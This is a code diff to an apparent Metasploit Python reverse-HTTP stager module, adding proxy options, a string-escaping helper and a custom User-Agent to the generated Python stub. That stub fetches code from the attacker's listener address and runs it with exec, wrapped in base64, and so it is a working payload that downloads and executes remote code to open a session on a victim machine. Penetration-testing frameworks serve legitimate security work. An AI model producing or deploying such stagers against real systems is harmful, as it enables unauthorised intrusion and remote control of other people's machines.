@@ -19,9 +19,14 @@ module Metasploit3
       'Platform'      => 'python',
       'Arch'          => ARCH_PYTHON,
       'Handler'       => Msf::Handler::ReverseHttp,
-      'Convention'    => 'http',
       'Stager'        => {'Payload' => ""}
     ))
+
+    register_options(
+      [
+        OptString.new('PROXYHOST', [ false, "The address of an http proxy to use", "" ]),
+        OptInt.new('PROXYPORT',    [ false, "The Proxy port to connect to", 8080 ])
+      ], Msf::Handler::ReverseHttp)
   end
 
   #
@@ -29,6 +34,10 @@ module Metasploit3
   #
   def generate
     lhost = datastore['LHOST'] || Rex::Socket.source_address
+
+    var_escape = lambda { |txt|
+      txt.gsub('\\', '\\'*4).gsub('\'', %q(\\\'))
+    }
 
     target_url  = 'http://'
     target_url << lhost
@@ -38,7 +47,16 @@ module Metasploit3
     target_url << generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITP)
 
     cmd  = "import sys\n"
-    cmd << "exec(__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]], fromlist=['urlopen']).urlopen('#{target_url}').read())\n"
+    if datastore['PROXYHOST'].blank?
+      cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener'])\n"
+      cmd << "opener=ul.build_opener()\n"
+    else
+      proxy_url = "http://#{datastore['PROXYHOST']}:#{datastore['PROXYPORT']}"
+      cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['ProxyHandler','build_opener'])\n"
+      cmd << "opener=ul.build_opener(ul.ProxyHandler({'http':'#{var_escape.call(proxy_url)}'}))\n"
+    end
+    cmd << "opener.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
+    cmd << "exec(opener.open('#{target_url}').read())\n"
 
     # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
     b64_stub  = "import base64,sys;exec(base64.b64decode("
